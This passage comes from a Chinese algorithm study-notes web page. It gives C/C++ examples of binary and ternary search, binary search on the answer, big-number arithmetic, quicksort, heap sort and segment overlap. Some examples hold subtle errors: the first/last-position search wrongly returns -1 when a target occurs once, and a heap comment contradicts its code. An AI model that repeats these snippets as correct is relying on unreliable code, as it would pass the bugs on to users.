class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 没有找到目标，返回 -1</span><br></code></pre></td></tr></table></figure><p>适用更广的前驱型——找最后一个 &lt;&#x3D; <code>target</code> 的元素的位置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> left = <span class="hljs-number">-1</span>, right = n<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;  <span class="hljs-comment">//向上取整</span><br>    <span class="hljs-keyword">if</span> (array[mid] &lt;= target)  <span class="hljs-comment">// array[mid] &gt; target此外也可以写别的条件也就是我们要的答案的基本性质</span><br>        left = mid;<br>    <span class="hljs-keyword">else</span><br>        right = mid - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> left + <span class="hljs-number">1</span>; <span class="hljs-comment">// 不安全返回n</span><br></code></pre></td></tr></table></figure><p>适用更广的后继型———找第一个 &gt;&#x3D; target 的数不存在</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> mid)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (array[mid] &gt;= target) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 如果大于等于目标值，返回true</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">binary_search_upper_bound</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n;  <br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-type">int</span> mid = (left + right) &gt;&gt; <span class="hljs-number">1</span>;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check</span>(mid))  <br>            right = mid;  <br>        <span class="hljs-keyword">else</span><br>            left = mid + <span class="hljs-number">1</span>;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> left;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>二分查找的“三步走”</strong>：</p><ul><li><strong>步骤 1</strong>：写出二分的条件，通常是一个“不等式”条件。例如，对于 <code>upper_bound</code> 查找，可以用“<code>val</code> 的数中最小的”这种不等式条件。</li><li><strong>步骤 2</strong>：将条件放到 <code>if</code> 中，并确定满足条件时需要缩小哪一半（<code>right = mid</code> 还是 <code>left = mid</code>）。</li><li><strong>步骤 3</strong>：另一半条件放在 <code>else</code> 中。通常可以是 <code>left = mid + 1</code> 或 <code>right = mid - 1</code>。对于向上取整或其他情况可以调整 <code>mid</code> 计算方式。</li></ul><p><strong>边界处理</strong>：</p><ul><li>如果题目存在无解情况，可以在返回值上调整，比如上界增加 1 或下界减少 1，以表示没有找到符合条件的值。</li></ul><hr><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><h5 id="寻找旋转排序数组中的最小值"><a href="#寻找旋转排序数组中的最小值" class="headerlink" title="寻找旋转排序数组中的最小值"></a>寻找旋转排序数组中的最小值</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMin</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (nums[mid] &lt;= nums[right])<br>            right = mid;<br>        <span class="hljs-keyword">else</span><br>            left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> nums[right];<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="在排序数组中查找元素的第一个和最后一个位置"><a href="#在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="在排序数组中查找元素的第一个和最后一个位置"></a>在排序数组中查找元素的第一个和最后一个位置</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; ans;<br><span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>();<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (nums[mid] &gt;= target)  <span class="hljs-comment">// 查找位置第一个 &gt;= target 的数</span><br>        right = mid;<br>    <span class="hljs-keyword">else</span><br>        left = mid + <span class="hljs-number">1</span>;<br>&#125;<br>ans.<span class="hljs-built_in">push_back</span>(right);<br><br>left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (nums[mid] &lt;= target)  <span class="hljs-comment">// 查找位置最后一个 &lt;= target 的数</span><br>        left = mid;<br>    <span class="hljs-keyword">else</span><br>        right = mid - <span class="hljs-number">1</span>;<br>&#125;<br>ans.<span class="hljs-built_in">push_back</span>(right);<br><br><span class="hljs-keyword">if</span> (ans[<span class="hljs-number">0</span>] == ans[<span class="hljs-number">1</span>]) <span class="hljs-keyword">return</span> &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>&#125;;<br><span class="hljs-keyword">return</span> ans;<br></code></pre></td></tr></table></figure><h4 id="实数平方根"><a href="#实数平方根" class="headerlink" title="实数平方根"></a>实数平方根</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">myRealSqrt</span><span class="hljs-params">(<span class="hljs-type">double</span> x)</span> </span>&#123;<br>    <span class="hljs-type">double</span> left = <span class="hljs-number">0</span>, right = x;<br>    <span class="hljs-keyword">while</span> (right - left &gt; <span class="hljs-number">1e-7</span>) &#123; <span class="hljs-comment">//要求比保留小数多2，这里就是5位小数</span><br>        <span class="hljs-type">double</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (mid * mid &lt;= x) &#123;<br>            left = mid;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            right = mid;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> right;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三分查找"><a href="#三分查找" class="headerlink" title="三分查找"></a>三分查找</h3><p><strong>算法步骤</strong>：</p><ul><li><strong>比较两点</strong> <code>lmid</code> 和 <code>rmid</code> 的函数值：<ul><li>如果 <code>f(lmid) &lt; f(rmid)</code>，则极值位于 <code>lmid</code> 的右边（排除 <code>lmid</code> 左侧区间），所以更新左边界 <code>left = lmid + 1</code>。</li><li>否则，极值位于 <code>rmid</code> 的左边（排除 <code>rmid</code> 右侧区间），更新右边界 <code>right = rmid - 1</code>。</li></ul></li><li>不断重复上述过程，直到区间收缩到极值点。</li></ul><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>    <span class="hljs-type">int</span> lmid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> rmid = (lmid + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (nums[lmid] &lt;= nums[rmid]) <br>        left = lmid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <br>        right = rmid - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> right;<br><br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li>该算法通过三分查找，逐渐缩小区间直到找到数组的峰值位置。</li><li>在单峰函数中，这种方法能有效找到极值点。</li></ul><hr><h3 id="二分答案"><a href="#二分答案" class="headerlink" title="二分答案"></a>二分答案</h3><p>二分答案的本质啊，就是去通过题目给的限制条件。建立一个单调分段，建立一个单调分段，零一函数啊，这个函数的。定义域是解空间，就答案值域是零或者一就是数，那么这个函数本身其实是。对这个限制的一个验证啊，一个判定。那么，通过这个函数，我们就可以在整个解上，对吧？这个。空间里边去二分查找这个分线点在什么地方，这就是我们要的答案。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><h5 id="分割数组问题"><a href="#分割数组问题" class="headerlink" title="分割数组问题"></a>分割数组问题</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">splitArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> m)</span> </span>&#123;<br>    <span class="hljs-type">int</span> left = *<span class="hljs-built_in">max_element</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 数组中的最大值</span><br>    <span class="hljs-type">int</span> right = <span class="hljs-built_in">accumulate</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);  <span class="hljs-comment">// 数组所有元素的和</span><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">canSplit</span>(nums, mid, m))<br>            right = mid;  <span class="hljs-comment">// 尝试减小最大值</span><br>        <span class="hljs-keyword">else</span><br>            left = mid + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 增大最大值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canSplit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> maxSum, <span class="hljs-type">int</span> m)</span> </span>&#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>, count = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>        sum += num;<br>        <span class="hljs-keyword">if</span> (sum &gt; maxSum) &#123;  <span class="hljs-comment">// 如果当前子数组的和超过了允许的最大值</span><br>            sum = num;<br>            count++;  <span class="hljs-comment">// 划分出新的子数组</span><br>            <span class="hljs-keyword">if</span> (count &gt; m) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高精度问题"><a href="#高精度问题" class="headerlink" title="高精度问题"></a>高精度问题</h3><h4 id="高精度加法"><a href="#高精度加法" class="headerlink" title="高精度加法"></a>高精度加法</h4><p>长度很长的情况下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">add</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, vector&lt;<span class="hljs-type">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (A.<span class="hljs-built_in">size</span>() &lt; B.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> <span class="hljs-built_in">add</span>(B, A);<br><br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++ )<br>    &#123;<br>        t += A[i];<br>        <span class="hljs-keyword">if</span> (i &lt; B.<span class="hljs-built_in">size</span>()) t += B[i];<br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (t) C.<span class="hljs-built_in">push_back</span>(t);<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="高精度减法"><a href="#高精度减法" class="headerlink" title="高精度减法"></a>高精度减法</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, vector&lt;<span class="hljs-type">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++ )<br>    &#123;<br>        t = A[i] - t;<br>        <span class="hljs-keyword">if</span> (i &lt; B.<span class="hljs-built_in">size</span>()) t -= B[i];<br>        C.<span class="hljs-built_in">push_back</span>((t + <span class="hljs-number">10</span>) % <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (t &lt; <span class="hljs-number">0</span>) t = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> t = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="高精度乘低精度"><a href="#高精度乘低精度" class="headerlink" title="高精度乘低精度"></a>高精度乘低精度</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// C = A * b, A &gt;= 0, b &gt; 0</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">mul</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; &amp;A, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.size() || t; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; A.size()) t += A[i] * b;<br>        C.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="高精度除以低精度"><a href="#高精度除以低精度" class="headerlink" title="高精度除以低精度"></a>高精度除以低精度</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// A / b = C ... r, A &gt;= 0, b &gt; 0，r是余数不用赋值直接传入就行</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">div</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; &amp;A, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;r)</span><br>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; C;<br>    r = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = A.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>    &#123;<br>        r = r * <span class="hljs-number">10</span> + A[i];<br>        C.push_back(r / b);<br>        r %= b;<br>    &#125;<br>    reverse(C.begin(), C.end());<br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><p>+++++</p><h2 id="二-排序"><a href="#二-排序" class="headerlink" title="二.排序"></a>二.排序</h2><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><ul><li><p>时间复杂度：O(n log n)</p></li><li><p>空间复杂度：O(log n)</p></li><li><p>稳定性：不稳定</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">int</span> i = l - <span class="hljs-number">1</span>, j = r + <span class="hljs-number">1</span>, x = q[l + r &gt;&gt; <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">while</span> (i &lt; j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i ++ ; <span class="hljs-keyword">while</span> (q[i] &lt; x);<br>        <span class="hljs-keyword">do</span> j -- ; <span class="hljs-keyword">while</span> (q[j] &gt; x);<br>        <span class="hljs-keyword">if</span> (i &lt; j) <span class="hljs-built_in">swap</span>(q[i], q[j]);<br>    &#125;<br>    <span class="hljs-built_in">quick_sort</span>(q, l, j), <span class="hljs-built_in">quick_sort</span>(q, j + <span class="hljs-number">1</span>, r);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>技巧</strong>：通过分治法将数组划分为较小的子数组，递归排序。</p><p>荷兰旗问题————划分两个区域</p><p>流程1——划分&gt;&lt;两个区域：当前数&lt;&#x3D;目标：先和&lt;&#x3D;区下一个位置交换，然后&lt;&#x3D;区向右扩，指针后移</p><p>​   当前数&gt;目标：指针直接后移</p><p>流程2——划分&gt;&#x3D;&lt;三个区域：当前数&lt;目标：先和&lt;区下一个位置交换，然后&lt;区向右扩，指针后移</p><p>​  当前数&#x3D;&#x3D;目标：指针直接后移</p><p>​  当前数&gt;目标：先和&gt;区的前一个数交换，然后&gt;区向左扩， 指针不要动</p><p>​</p><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p>堆就是 <code>完全二叉树</code>+<code>满足大根或小根的结构</code>(一代不如一代，越来越强的一代)</p><p>我们由数组脑补出完全二叉树的结构，堆只有向上调整和向下调整两种算法</p><ul><li>时间复杂度：O(n log n)</li><li>空间复杂度：O(1)</li><li>稳定性：不稳定</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heap_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    priority_queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    <span class="hljs-comment">// 将所有元素压入堆中，形成一个最大堆</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        q.<span class="hljs-built_in">push</span>(-a[i]);  <span class="hljs-comment">// 使用负值来模拟最小堆</span><br>    &#125;<br>    <span class="hljs-comment">// 将堆中的元素依次弹出，得到有序序列</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        a[i] = -q.<span class="hljs-built_in">top</span>();  <span class="hljs-comment">// 取出最小值并存入数组</span><br>        q.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>技巧</strong>：利用堆结构维护最大或最小堆。</p><p>最大线段重合问题</p><p>给定很多线段，每个线段都有两个数[start,end]表示线段开始位置和结束位置，左右都是闭区间规定：<br>1)线段的开始和结束位置一定都是整数值<br>2)线段重合区域的长度必须&gt;&#x3D;1<br>返回线段最多重合区域中，包含了几条线段</p><p>流程准备一个小根堆，将所有线段以第一个数的大小从小到大排序这些线段，开始执行：第一个线段将二位置放入堆中，当小根堆里有小于等于此线段第一个数时，把他取出，然后将线段第二个数push进堆里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LineSegment</span> &#123;</span><br>    <span class="hljs-type">int</span> start;<br>    <span class="hljs-type">int</span> end;<br>&#125;;<br><br><span class="hljs-comment">// 比较函数：按 start 升序排列</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">compareByStart</span><span class="hljs-params">(<span class="hljs-type">const</span> LineSegment&amp; a, <span class="hljs-type">const</span> LineSegment&amp; b)</span> &#123;<br>    <span class="hljs-keyword">return</span> a.start &lt; b.start;  <span class="hljs-comment">// 返回 true 表示 a 排在前面</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxOverlapSegments</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;LineSegment&gt;&amp; segments)</span> &#123;<br>    <span class="hljs-keyword">if</span> (segments.empty()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 1. 将所有线段按 start 排序</span><br>    sort(segments.begin(), segments.end(), compareByStart);<br>    <span class="hljs-comment">// 2. 小根堆用于存储线段的结束位置（end）</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq;<br>    <span class="hljs-comment">// 3. 初始化最大重叠数</span><br>    <span class="hljs-type">int</span> maxOverlap = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 4. 遍历所有线段</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; segment : segments) &#123;<br>        <span class="hljs-comment">// 取出所有结束位置小于等于当前线段起始位置的线段</span><br>        <span class="hljs-keyword">while</span> (!pq.empty() &amp;&amp; pq.top() &lt;= segment.start) &#123;<br>            pq.pop();  <span class="hljs-comment">// 这些线段不再重叠</span><br>        &#125;<br>        <span class="hljs-comment">// 将当前线段的结束位置加入堆</span><br>        pq.push(segment.end);<br>        <span class="hljs-comment">// 记录堆中当前的线段数，即当前重叠的线段数</span><br>        maxOverlap = max(maxOverlap, (<span class="hljs-type">int</span>)pq.size());<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxOverlap;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;LineSegment&gt; segments = &#123; &#123;<span class="hljs-number">1</span>, <span class="hljs-number">4</span>&#125;, &#123;<span 